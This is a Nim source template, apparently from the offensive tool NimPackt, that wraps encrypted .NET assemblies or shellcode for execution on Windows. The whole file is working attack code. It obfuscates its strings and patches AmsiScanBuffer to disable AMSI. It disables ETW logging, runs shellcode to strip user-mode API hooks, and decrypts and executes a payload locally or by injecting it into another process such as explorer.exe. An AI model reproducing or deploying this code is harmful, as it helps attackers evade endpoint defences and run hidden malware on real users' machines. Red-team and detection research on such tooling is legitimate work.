#[
    NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
    By Cas van Cooten (@chvancooten)

    This is a template file. For usage please refer to README.md

    ===
    
    References:

        Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim


        Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
        https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
]#

import nimcrypto
import winim/clr except `[]`
import winim/lean
import winim/com
import strformat
import os
import dynlib
import base64
import osproc
from bitops import bitor

### Modified code from Nim-Strenc to avoid XORing of long strings
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc fWorgaKn0rg(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var encodedCounter {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro xorStrings*{s}(s: string{lit}): untyped =
    if len($s) < 1000:
        var encodedStr = fWorgaKn0rg(estring($s), encodedCounter)
        result = quote do:
            fWorgaKn0rg(estring(`encodedStr`), `encodedCounter`)
        encodedCounter = (encodedCounter *% 16777619) and 0x7FFFFFFF
    else:
        result = s

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
#[ PLACEHOLDERCRYPTKEY ]#

# Run shellcode user VirtualProtect()
proc rscvp(payload: openArray[byte]): void =
    var oldProtect : DWORD
    var ret = VirtualProtect(payload.unsafeAddr, len(payload), PAGE_EXECUTE_READWRITE, oldProtect.addr)
    when defined verbose:
        doAssert ret != 0, "Error executing VirtualProtect()"
    let f = cast[proc(){.nimcall.}](payload.unsafeAddr)
    f()

# Run shellcode using VirtualAlloc()
# proc rscva(payload: openArray[byte]): void =
#     var allocated = VirtualAlloc(nil, len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
#     when defined verbose:
#         doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
#     copyMem(allocated, payload[0].unsafeAddr, len(payload))
#     let f = cast[proc(){.nimcall.}](allocated)
#     f()

when defined patchAmsi:
    # Get the AMSI patch bytes based on arch
    when defined amd64:
        when defined verbose:
            echo "[*] Running in x64 process"
        const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        when defined verbose:
            echo "[*] Running in x86 process"
        const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

    proc patchAmsi(): bool =
        var
            amsi: LibHandle
            cs: pointer
            op: DWORD
            t: DWORD
            disabled: bool = false

        amsi = loadLib("amsi")
        if isNil(amsi):
            when defined verbose:
                echo "[X] Failed to load amsi.dll"
            return disabled

        cs = amsi.symAddr("AmsiScanBuffer")
        if isNil(cs):
            when defined verbose:
                echo "[X] Failed to get the address of 'AmsiScanBuffer'"
            return disabled

        if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
            copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
            VirtualProtect(cs, amsiPatch.len, op, addr t)
            disabled = true

        return disabled

when defined disableEtw:
    proc disableEtw(): void =
        var success : bool
        var cometw = "COMPlus_ETWEnabled"
        var setnull = "0"
        putenv(cometw,setnull)
        if getEnv(cometw) == setnull:
            success = true
        else:
            success = false
        when defined verbose:
            echo fmt"[*] ETW disabled: {bool(success)}"

when defined patchApiCalls:
    proc patchApiCalls(cryptedCoat: string, key: array[16, byte], iv: array[16, byte]): void =
        let cryptedCoatBytes = toByteSeq(decode(cryptedCoat))

        var
            encodedCoat = newSeq[byte](len(cryptedCoatBytes))
            decodedCoat = newSeq[byte](len(cryptedCoatBytes))

        encodedCoat = cryptedCoatBytes
        var dctx: CTR[aes128]
        dctx.init(key, iv)
        dctx.decrypt(encodedCoat, decodedCoat)
        dctx.clear()

        # Remove user-mode API hooks by running ShellyCoat shellcode
        rscvp(decodedCoat)
        # rscva(decodedCoat)
        when defined verbose:
            echo "[*] User-mode API hooks removed: true"

when defined executeAssembly:
    proc executeAssembly(decodedPay: openArray[byte]): void =
        var assembly = load(decodedPay)

        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let arr = toCLRVariant(["argument1", "argument2"], VT_BSTR)
        #[ PLACEHOLDERARGUMENTS ]#

        when defined verbose:
            echo "[*] Executing assembly..."
            
        assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

when defined shinject:
    proc shinject(decodedPay: openArray[byte]): void =
        when defined verbose:
            echo "[*] Executing shellcode in local thread..."

        # rscva(decodedPay)
        rscvp(decodedPay)

when defined remoteShinject:
    proc injectShellcodeRemote(shellcode: openArray[byte], tprocessName: string, injectExistingProcess: bool): void =
        var tProcessId : DWORD

        if injectExistingProcess == true:
            when defined verbose:
                echo "[*] Injecting in existing process..."
            
            let wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

            for process in wmi.execQuery("SELECT * FROM win32_process"):
                if process.name == tProcessName:
                    tProcessId = process.handle

        else:
            when defined verbose:
                echo "[*] Injecting in new process..."

            let tProcess = startProcess(tProcessName)
            tProcess.suspend() 
            defer: tProcess.close()
            tProcessId = cast[DWORD](tProcess.processID)

        when defined verbose:
            echo "[*] Target Process: ", tProcessName, " [", tProcessId, "]"

        let pHandle = OpenProcess(
            PROCESS_ALL_ACCESS, 
            false, 
            tProcessId
        )
        defer: CloseHandle(pHandle)

        when defined verbose:
            echo "[*] pHandle: ", pHandle

        var commitMem : DWORD

        if injectExistingProcess == true:
            commitMem = bitor(MEM_COMMIT, MEM_RESERVE)
        else:
            commitMem = MEM_COMMIT

        let rPtr = VirtualAllocEx(
            pHandle,
            NULL,
            cast[SIZE_T](shellcode.len),
            commitMem,
            PAGE_EXECUTE_READ_WRITE
        )

        var bytesWritten: SIZE_T
        let wSuccess = WriteProcessMemory(
            pHandle, 
            rPtr,
            unsafeAddr shellcode,
            cast[SIZE_T](shellcode.len),
            addr bytesWritten
        )

        when defined verbose:
            echo "[*] WriteProcessMemory: ", bool(wSuccess)
            echo "    \\-- bytes written: ", bytesWritten
            echo ""

        var tHandle : HANDLE

        if injectExistingProcess == true:
            tHandle = CreateRemoteThread(
                pHandle, 
                NULL,
                0,
                cast[LPTHREAD_START_ROUTINE](rPtr),
                NULL, 
                NULL, 
                NULL
            )
            defer: CloseHandle(tHandle)
        else:
            tHandle = CreateRemoteThread(
                pHandle, 
                NULL,
                0,
                cast[LPTHREAD_START_ROUTINE](rPtr),
                NULL, 
                0, 
                NULL
            )
            defer: CloseHandle(tHandle)

        when defined verbose:
            echo "[*] tHandle: ", tHandle
            echo "[+] Injected"

    proc remoteShinject(decodedPay: openArray[byte]) : void =
        when defined verbose:
            echo "[*] Executing shellcode in remote thread..."

        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: injectShellcodeRemote(decodedPay, "explorer.exe", true)
        #[ PLACEHOLDERINJECTCALL ]#

proc mainMain() : void =

    #[
        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
        let b64buf = "ZXhhbXBsZQo="
        let cryptedCoat = ""
        let cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]

        (key is defined separately as a const to prevent the values from being too close together)
    ]#
    #[ PLACEHOLDERCRYPTEDINPUT ]#
    #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
    #[ PLACEHOLDERCRYPTIV ]#

    when defined patchAmsi:
        # Patch AMSI
        var success : bool
        success = patchAmsi()
    when defined verbose:
            echo fmt"[*] AMSI disabled: {bool(success)}"

    when defined disableEtw:
        # Disable ETW
        disableEtw()

    # Prepare decryption stuff
    let cryptedInput = toByteSeq(decode(b64buf))
    
    var
        key : array[aes128.sizeKey, byte]
        iv : array[aes128.sizeBlock, byte]
        encodedPay = newSeq[byte](len(cryptedInput))
        decodedPay = newSeq[byte](len(cryptedInput))

    key = cryptKey
    iv = cryptIV
    encodedPay = cryptedInput

    when defined patchApiCalls:
        # Decrypt ShellyCoat shellcode
        patchApiCalls(cryptedCoat, key, iv)
            
    # Decrypt the encrypted bytes of the main payload
    var dctx2: CTR[aes128]
    dctx2.init(key, iv)
    dctx2.decrypt(encodedPay, decodedPay)
    dctx2.clear()

    when defined executeAssembly:
        executeAssembly(decodedPay)

    when defined shinject:
        shinject(decodedPay)

    when defined remoteShinject:
        remoteShinject(decodedPay)

when defined exportExe:
    when isMainModule:
        mainMain()

when defined exportDll:
    proc NimMain() {.cdecl, importc.}

    proc Update(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
        NimMain()
        mainMain()
        return true